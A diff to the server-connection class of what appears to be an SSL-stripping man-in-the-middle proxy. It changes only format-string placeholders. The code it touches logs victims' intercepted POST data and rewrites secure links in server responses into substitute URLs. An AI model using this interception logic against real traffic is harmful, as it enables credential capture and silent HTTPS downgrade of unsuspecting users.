@@ -77,13 +77,13 @@ class ServerConnection(HTTPClient):
 
             clientlog.info(self.headers['host'], extra=self.clientInfo)
 
-            log.debug("Full request: {}{}".format(self.headers['host'], self.uri))
+            log.debug("Full request: {0}{1}".format(self.headers['host'], self.uri))
 
         self.sendCommand(self.command, self.uri)
 
     def sendHeaders(self):
         for header, value in self.headers.iteritems():
-            log.debug("Sending header: ({}: {})".format(header, value))
+            log.debug("Sending header: ({0}: {1})".format(header, value))
             self.sendHeader(header, value)
 
         self.endHeaders()
@@ -93,10 +93,10 @@ class ServerConnection(HTTPClient):
             try:
                 postdata = self.postData.decode('utf8') #Anything that we can't decode to utf-8 isn't worth logging
                 if len(postdata) > 0:
-                    clientlog.warning("POST Data ({}):\n{}".format(self.headers['host'], postdata), extra=self.clientInfo)
+                    clientlog.warning("POST Data ({0}):\n{1}".format(self.headers['host'], postdata), extra=self.clientInfo)
             except Exception as e:
                 if ('UnicodeDecodeError' or 'UnicodeEncodeError') in e.message:
-                    log.debug("{} Ignored post data from {}".format(self.clientInfo['clientip'], self.headers['host']))
+                    log.debug("{0} Ignored post data from {1}".format(self.clientInfo['clientip'], self.headers['host']))
 
         self.handle_post_output = False
         self.transport.write(self.postData)
@@ -135,7 +135,7 @@ class ServerConnection(HTTPClient):
         code    = values['code']
         message = values['message']
 
-        log.debug("Server response: {} {} {}".format(version, code, message))
+        log.debug("Server response: {0} {1} {2}".format(version, code, message))
         self.client.setResponseCode(int(code), message)
 
     def handleHeader(self, key, value):
@@ -180,7 +180,7 @@ class ServerConnection(HTTPClient):
 
         if logging.getLevelName(log.getEffectiveLevel()) == "DEBUG":
             for header, value in self.client.headers.iteritems():
-                log.debug("Receiving header: ({}: {})".format(header, value)) 
+                log.debug("Receiving header: ({0}: {1})".format(header, value)) 
 
     def handleResponsePart(self, data):
         if (self.isImageRequest):
@@ -207,7 +207,7 @@ class ServerConnection(HTTPClient):
         data = self.plugins.hook()['data']
 
         #log.debug("Read from server {} bytes of data:\n{}".format(len(data), data))
-        log.debug("Read from server {} bytes of data".format(len(data)))
+        log.debug("Read from server {0} bytes of data".format(len(data)))
 
         if (self.contentLength != None):
             self.client.setHeader('Content-Length', len(data))
@@ -229,7 +229,7 @@ class ServerConnection(HTTPClient):
             patchDict = self.urlMonitor.patchDict
 
             if patchDict:
-                dregex = re.compile("({})".format("|".join(map(re.escape, patchDict.keys()))))
+                dregex = re.compile("({0})".format("|".join(map(re.escape, patchDict.keys()))))
                 data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
 
             iterator = re.finditer(ServerConnection.urlExpression, data)       
@@ -238,11 +238,11 @@ class ServerConnection(HTTPClient):
 
                 log.debug("Found secure reference: " + url)
                 nuevaurl=self.urlMonitor.addSecureLink(self.clientInfo['clientip'], url)
-                log.debug("Replacing {} => {}".format(url,nuevaurl))
+                log.debug("Replacing {0} => {1}".format(url,nuevaurl))
                 sustitucion[url] = nuevaurl
 
             if sustitucion:
-                dregex = re.compile("({})".format("|".join(map(re.escape, sustitucion.keys()))))
+                dregex = re.compile("({0})".format("|".join(map(re.escape, sustitucion.keys()))))
                 data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
 
             return data
